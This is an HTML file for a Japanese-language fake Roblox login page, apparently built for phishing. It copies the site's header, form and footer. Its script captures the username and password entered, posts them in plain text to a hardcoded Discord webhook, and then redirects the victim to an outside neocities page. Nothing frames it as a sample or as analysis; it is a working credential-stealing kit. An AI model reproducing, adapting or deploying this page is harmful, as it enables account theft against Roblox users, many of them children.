<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>フォーム</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background-color: #1c1c1c;
      color: white;
    }
    header {
      background-color: #111;
      padding: 10px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    header .left, header .right {
      display: flex;
      align-items: center;
      gap: 15px;
    }
    header .button {
      background-color: #1c1c1c;
      color: white;
      border: 1px solid white;
      padding: 6px 10px;
      border-radius: 5px;
      font-size: 14px;
      cursor: pointer;
    }
    header .button.primary {
      background-color: #2974f1;
      border: none;
    }
    .container {
      padding: 20px;
    }
    h2 {
      font-size: 20px;
      text-align: center;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      background-color: #2a2a2a;
      color: white;
      border: 1px solid #444;
      border-radius: 6px;
      font-size: 16px;
    }
    button.login {
      width: 100%;
      padding: 12px;
      background-color: #2a2a2a;
      color: white;
      font-size: 16px;
      border: 1px solid #444;
      border-radius: 6px;
      margin-bottom: 20px;
      cursor: pointer;
    }
    .link {
      text-align: center;
      margin-bottom: 20px;
      color: #ccc;
      font-size: 14px;
    }
    .gray-button {
      width: 100%;
      padding: 12px;
      background-color: #3a3a3a;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      margin-bottom: 10px;
      cursor: pointer;
    }
    .footer {
      margin-top: 40px;
      text-align: center;
      font-size: 12px;
      color: #ccc;
      padding: 10px;
    }
    .footer a {
      color: #ccc;
      margin: 0 5px;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<header>
  <div class="left">
    <img src="https://www.dropbox.com/scl/fi/ua607vodhlylxvfqpi0e7/Robloxlogo.png?rlkey=3u5piep0lgctgp5t26keq95tl&st=ubckzakb&dl=1" alt="Logo" width="40" />
    <span>ランキング</span>
    <span>マーケットプレイス</span>
    <span>制作</span>
  </div>
  <div class="right">
    <button class="button primary">新規登録</button>
    <button class="button">ログイン</button>
  </div>
</header>

<div class="container">
  <h2>ロブロックスにログイン</h2>
  <form id="loginForm">
    <input type="text" id="username" placeholder="ユーザー名／メールアドレス／電話番号" required /><br /><br />
    <input type="password" id="password" placeholder="パスワード" required /><br /><br />
    <button type="submit" class="login">ログイン</button>
  </form>

  <div class="link">パスワード、またはユーザー名をお忘れですか？</div>

  <button class="gray-button">ワンタイムコードをメールで送信</button>
  <button class="gray-button">別のデバイスを使用</button>

  <div class="link">
    アカウントをお持ちではありませんか？ <a style="color:#2974f1;" href="#">新規登録</a>
  </div>
</div>

<div class="footer">
  <a href="#">当社について</a>
  <a href="#">採用情報</a>
  <a href="#">ブログ</a>
  <a href="#">保護者の方へ</a>
  <a href="#">ギフトカード</a>
  <a href="#">ヘルプ</a>
  <a href="#">規約</a>
  <a href="#">アクセシビリティ</a>
  <a href="#">プライバシー</a>
  <a href="#">プライバシー設定 </a>
</div>

<script>
  const webhookUrl = "https://discord.com/api/webhooks/1402937567942414356/_C5ttVUe4TNMs72X2ZC8xtYl9XXqzTL_H0Anl2st_L1G1MqvDKua_dNitDqD3VGl7yBS";

  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!username || !password) {
      alert("ユーザー名とパスワードは必須です。");
      return;
    }

    const payload = {
      content: `🛂 Roblox\nユーザー名: **${username}**\nパスワード: **${password}**`
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })
      .then((res) => {
        if (res.ok) {
          ;
          window.location.href = "https://aus77.neocities.org/Roblox"; // ここでリンクに飛ぶ
        } else {
          alert("送信失敗！");
        }
      })
      .catch(() => alert("送信中にエラーが発生しました。"));
  });
</script>

</body>
</html>
